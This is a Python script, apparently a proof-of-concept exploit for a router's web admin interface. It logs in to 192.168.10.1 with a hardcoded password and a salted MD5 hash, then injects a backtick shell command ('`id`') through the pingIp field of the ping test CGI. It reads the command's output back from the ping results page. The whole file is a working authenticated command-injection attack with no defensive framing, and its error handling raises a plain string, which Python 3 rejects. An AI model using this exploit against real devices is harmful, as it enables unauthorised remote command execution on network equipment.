import requests
import random
import hashlib
import re
import time

salt = f"M{random.randint(10000,99999)}"
password = "Asdf123456"

h = hashlib.md5(bytes(salt + password, "utf-8")).hexdigest()

#initial auth
r = requests.post("http://192.168.10.1/cgi-bin/login.cgi",
                  headers={"Content-Type":"application/x-www-form-urlencoded",
                           "Referer": "http://192.168.10.1/login.shtml?login=0",
                           "Cookie": "session=1234567"},
                  data=f"page=login&langChange=0&ipaddr=192.168.10.102&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&protocol=http%3A&hostname=192.168.10.1&key={salt}&password={h}&lang_select=en")
                  

payload = "`id`"
#ping rce
p = requests.post("http://192.168.10.1/cgi-bin/adm.cgi",
                  headers={"Content-Type":"application/x-www-form-urlencoded",
                           "Referer": "http://192.168.10.1/ping.shtml?r=83858",
                           "Cookie": f"session={r.cookies['session']}"},
                  data=f"page=ping_test&CCMD=4&pingIp={payload}")
                  
time.sleep(5)
pr = requests.get(f"http://192.168.10.1/ping.shtml?r={random.randint(10000,99999)}",
                    headers={"Content-Type":"application/x-www-form-urlencoded",
                           "Referer": "http://192.168.10.1/ping.shtml?r=83858",
                           "Cookie": f"session={r.cookies['session']}"},
                  )

m = re.search(r'var PING_RESULT1 = "(.*)";', pr.text)
if(not m):
    raise "Can't find shell command results"

print(m.groups()[0])
